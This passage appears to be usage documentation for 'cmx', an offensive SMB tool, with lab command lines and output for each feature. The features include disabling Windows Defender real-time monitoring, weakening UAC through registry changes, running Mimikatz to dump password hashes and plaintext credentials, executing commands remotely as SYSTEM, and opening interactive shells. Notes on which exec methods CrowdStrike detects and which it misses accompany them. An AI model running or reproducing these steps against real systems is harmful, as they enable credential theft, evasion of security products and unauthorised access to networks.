Mar.25.20 19:19:19  MIMIK...    192.168.0.103        Saved raw Mimikatz output to /root/.cmx/logs/Mimikatz_against_192.168.0.103_on_Mar.25.20_at_1919.log
```









------------------------------------------------------------------------
# WMI Query Execution


|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | false       | false       | true       |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

### Command Syntax  
`cmx smb TARGET -u Username -p Pass --wmi "QUERY"`
`cmx smb TARGET -u Username -p Pass --wmi "SELECT * FROM Win32_logicalDisk WHERE DeviceID = 'C:'"`

```
# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! --local-auth --wmi "SELECT * FROM Win32_logicalDisk WHERE DeviceID = 'C:'"
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST [*] Executing query:"SELECT * FROM Win32_logicalDisk WHERE DeviceID = 'C:'" over wmi...
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Caption => C:
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Description => Local Fixed Disk
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    InstallDate => None
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Name => C:
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Status => None
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Availability => 65535
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    CreationClassName => Win32_LogicalDisk
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    ConfigManagerErrorCode => None
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    ConfigManagerUserConfig => True
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    DeviceID => C:
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    PowerManagementCapabilities => None
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    PNPDeviceID => None
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    PowerManagementSupported => True
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    StatusInfo => 65535
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    SystemCreationClassName => Win32_ComputerSystem
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    SystemName => WIN10TEST
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    LastErrorCode => None
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    ErrorDescription => None
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    ErrorCleared => True
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Access => 65535
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    BlockSize => 18446744073709551615
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    ErrorMethodology => None
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    NumberOfBlocks => 18446744073709551615
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Purpose => None
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    FreeSpace => 21780078592
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Size => 42947571712
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Compressed => None
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    DriveType => 3
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    FileSystem => NTFS
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    MaximumComponentLength => 255
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    ProviderName => None
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    SupportsFileBasedCompression => True
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    VolumeName => Windows 10
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    VolumeSerialNumber => B009E7A9
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    MediaType => 12
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    SupportsDiskQuotas => True
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    QuotasDisabled => True
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    QuotasIncomplete => None
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    QuotasRebuilding => None
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    VolumeDirty => None
Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST
```






------------------------------------------------------------------------
# UAC


|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | false       | false       | true       |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

### Check UAC Status  
This queries for several registry keys, applies logic based on results, informs you of current UAC scenario.

### Command Syntax  
`cmx smb TARGET -u Username -p Pass -uac-status`

```
# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! --local-auth -uac-status
Apr.03.20 15:33:51  SMB      192.168.0.150 WIN10TEST [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
Apr.03.20 15:33:51  SMB      192.168.0.150 WIN10TEST [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST    UAC Status:
Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST        enableLua = 1  (default)
Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST        LocalAccountTokenFilterPolicy = 1
Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST        FilterAdministratorToken key does not exist!
Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST
Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST    UAC Analysis:
Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST    EnableLUA current setting means capabilities are determined by
Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST             LocalAccountTokenFilterPolicy and/or FilterAdministratorToken
Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST
Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST    LocalAccountTokenFilterPolicy configured to allow remote connections with high integrity access tokens!
```


### Fix UAC

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | true        | false       | true       |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

This modifies registry keys pertaining to UAC.

### Command Syntax  
`cmx smb TARGET -u Username -p Pass -fix-uac`

```
# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! --local-auth -fix-uac
Apr.03.20 15:36:38  SMB      192.168.0.150 WIN10TEST [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
Apr.03.20 15:36:38  SMB      192.168.0.150 WIN10TEST [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
Apr.03.20 15:36:39  SMB      192.168.0.150 WIN10TEST    EnableLUA Key Set!
Apr.03.20 15:36:39  SMB      192.168.0.150 WIN10TEST    LocalAccountTokenFilterPolicy Key Set!
```
after the change, getting status
```
# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! --local-auth -uac-status
Apr.03.20 15:37:10  SMB      192.168.0.150 WIN10TEST [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
Apr.03.20 15:37:10  SMB      192.168.0.150 WIN10TEST [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
Apr.03.20 15:37:12  SMB      192.168.0.150 WIN10TEST    UAC Status:
Apr.03.20 15:37:12  SMB      192.168.0.150 WIN10TEST        enableLua = 0
Apr.03.20 15:37:12  SMB      192.168.0.150 WIN10TEST        LocalAccountTokenFilterPolicy = 1
Apr.03.20 15:37:12  SMB      192.168.0.150 WIN10TEST        FilterAdministratorToken key does not exist!
Apr.03.20 15:37:12  SMB      192.168.0.150 WIN10TEST
Apr.03.20 15:37:12  SMB      192.168.0.150 WIN10TEST    UAC Analysis:
Apr.03.20 15:37:12  SMB      192.168.0.150 WIN10TEST    High integrity access available to any member of the local admins group
Apr.03.20 15:37:12  SMB      192.168.0.150 WIN10TEST               using plaintext credentials or password hashes!
```



------------------------------------------------------------------------
# Kill Defender


|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | true        | false       | false*     |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

This executes `Set-MpPreference -DisableRealtimeMonitoring $true` to turn off real-time monitoring.
This switch is designed to be used in combination with other execution modules.

### Command Syntax  
`cmx smb TARGET -u Username -p Pass -kd <command>`

```
# cmx smb 192.168.0.103 -u eminem -p Admin\!23 -kd -M mimikatz
Mar.25.20 19:19:00  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
Mar.25.20 19:19:00  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
            [!] Sleeping to allow defender process to finish shutting down[!] 
Mar.25.20 19:19:10  MIMIK...    192.168.0.103        - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
Mar.25.20 19:19:19  MIMIK...    192.168.0.103        - - "POST / HTTP/1.1" 200 -
Mar.25.20 19:19:19  MIMIK...    192.168.0.103           swamp.local\arianna:bbc2bf2fbca9dd9ed74d3c1b55e3d727
Mar.25.20 19:19:19  MIMIK...    192.168.0.103           swamp.local\WIN7A$:42d8cf1444bb879485532fea86c9e53e
Mar.25.20 19:19:19  MIMIK...    192.168.0.103           swamp.local\arianna:User!23
Mar.25.20 19:19:19  MIMIK...    192.168.0.103        [+] Added 3 credential(s) to the database
Mar.25.20 19:19:19  MIMIK...    192.168.0.103        Saved raw Mimikatz output to /root/.cmx/logs/Mimikatz_against_192.168.0.103_on_Mar.25.20_at_1919.log
```






------------------------------------------------------------------------
# Dual Homed

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | true        | false       | true       |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

This module checks the nic's on a host to try and identify hosts that are dual homed. 

### Command Syntax  
`cmx smb TARGET -u Username -p Pass --dualhome`

```
# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! --dualhome
Apr.03.20 16:13:23  SMB      192.168.0.150 WIN10TEST [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
Apr.03.20 16:13:23  SMB      192.168.0.150 WIN10TEST [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
Apr.03.20 16:13:23  SMB      192.168.0.150 WIN10TEST    DNSDomainSuffixSearchOrder => []
Apr.03.20 16:13:23  SMB      192.168.0.150 WIN10TEST    IPAddress => ['192.168.0.150', 'fe80::a4d5:c938:3395:a8b4']
Apr.03.20 16:13:23  SMB      192.168.0.150 WIN10TEST
```









------------------------------------------------------------------------
# Command Execution

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | true        | false       | false*     |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

smbexec and psexec will get caught by crowdstrike.  smbexec will hardfail, psexec will still return results.
All others were not detected by crowdstrike or defender!  


Commands execute as the user or as SYSTEM.  
The exec-method will change the context of the command execution.  
Based on the exec-method, commands may or may not have the correct session context to contact the domain controller to perform domain/network requests.
Default execution method is WMIEXEC.  

Context table:

|---------------+-------------+---------------|
| Method        | Context     | Domain Access |
|---------------|-------------|---------------|
| wmiexec       | USER        | false         |
|---------------|-------------|---------------|
| dcomexec      | USER        | false         |
|---------------|-------------|---------------|
| psexec        | SYSTEM      | TRUE          |
|---------------|-------------|---------------|
| smbexec       | SYSTEM      | TRUE          |
|---------------|-------------|---------------|
| atexec        | SYSTEM      | TRUE          |
|---------------+-------------+---------------|
{: .tablelines}


### Command Syntax  
`cmx smb TARGET -u Username -p Pass [--exec-method <method>] -x <command>`

```
# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! -x whoami
Apr.03.20 15:45:47  SMB      192.168.0.150 WIN10TEST [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
Apr.03.20 15:45:47  SMB      192.168.0.150 WIN10TEST [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
Apr.03.20 15:45:47  SMB      192.168.0.150 WIN10TEST [*] Executed command via wmiexec
Apr.03.20 15:45:48  SMB      192.168.0.150 WIN10TEST [+] Execution Completed.
Apr.03.20 15:45:48  SMB      192.168.0.150 WIN10TEST [+] Results:
Apr.03.20 15:45:48  SMB      192.168.0.150 WIN10TEST    win10test\ieuser
```

```
# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! --exec-method atexec -x whoami
Apr.03.20 15:48:52  SMB      192.168.0.150 WIN10TEST [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
Apr.03.20 15:48:52  SMB      192.168.0.150 WIN10TEST [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
Apr.03.20 15:48:52  SMB      192.168.0.150 WIN10TEST [*] Executed command via atexec
Apr.03.20 15:48:55  SMB      192.168.0.150 WIN10TEST [+] Execution Completed.
Apr.03.20 15:48:55  SMB      192.168.0.150 WIN10TEST [+] Results:
Apr.03.20 15:48:55  SMB      192.168.0.150 WIN10TEST    b'nt authority\\system'
```







------------------------------------------------------------------------
# Getting Shellular

|---------------+-------------+-------------+-------------+------------|
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| TRUE          | false       | true        | false       | true*      |
|---------------+-------------+-------------+-------------+------------|
{: .tablelines}

smbexec and psexec will get caught by crowdstrike.


Context table:

|---------------+-------------+---------------|
| Method        | Context     | Domain Access |
|---------------|-------------|---------------|
| wmiexec       | USER        | false         |
|---------------|-------------|---------------|
| dcomexec      | USER        | false         |
|---------------|-------------|---------------|
| psexec        | not-working | not-working   |
|---------------|-------------|---------------|
| smbexec       | SYSTEM      | TRUE          |
|---------------|-------------|---------------|
| atexec        | not-working | not-working   |
|---------------+-------------+---------------|
{: .tablelines}


### Command Syntax  
`cmx smb TARGET -u Username -p Pass [--exec-method <method>] -i`

Default exec-method is wmi
```
# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! -i
Apr.03.20 16:18:14  SMB      192.168.0.150 WIN10TEST [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
Apr.03.20 16:18:14  SMB      192.168.0.150 WIN10TEST [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
Apr.03.20 16:18:14  SMB      192.168.0.150 WIN10TEST [*] Bout to get shellular
   .... i'm in
 Type help for extra shell commands
C:\>whoami
win10test\ieuser

C:\>hostname
WIN10TEST

C:\>exit
```

SMBexec provides a domain context
```
# cmx smb 192.168.0.105 -u eminem -p Admin\!23 --exec-method smbexec -i
Apr.03.20 16:35:12  SMB      192.168.0.105 SERVER2019A [*] Windows 10.0 Build 17763 x64 (domain:SWAMP) (signing:False) (SMBv:3.0)
Apr.03.20 16:35:12  SMB      192.168.0.105 SERVER2019A [+] SWAMP\eminem:Admin!23 (Pwn3d!)
Apr.03.20 16:35:12  SMB      192.168.0.105 SERVER2019A [*] Bout to get shellular
   .... i'm in

C:\Windows\system32>net user /domain
The request will be processed at a domain controller for domain swamp.local.


User accounts for \\dc2012a.swamp.local

-------------------------------------------------------------------------------
392648SA                 572543SA                 Administrator
ALANA_WATSON             AMY_KEY                  ANNA_FITZGERALD
arianna                  BEAU_CALDERON            BETTYE_KAUFMAN
BRITTNEY_FERNANDEZ       DINA_POTTER              drake
eminem                   GINO_FLYNN               gucci
Guest                    JO_COOKE                 joyner
krbtgt                   MARVA_ONEILL             NADIA_BRADFORD
NELDA_BARRETT            OLEN_ROSS                PHILIP_BARRETT
TERRELL_WIGGINS          TONIA_BRADY              wayne
YESENIA_CARLSON
The command completed with one or more errors.


C:\Windows\system32>exit
```
